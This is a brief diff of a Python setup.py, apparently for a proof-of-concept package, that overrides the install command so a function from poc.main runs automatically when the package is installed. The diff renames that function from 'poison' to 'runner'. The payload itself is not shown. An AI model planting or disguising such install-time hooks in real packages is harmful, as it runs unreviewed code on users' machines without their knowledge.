@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 
-from poc.main import poison
+from poc.main import runner
 
 
 class Installer(install):
     def run(self):
-        poison()
+        runner()
         install.run(self)
 
 
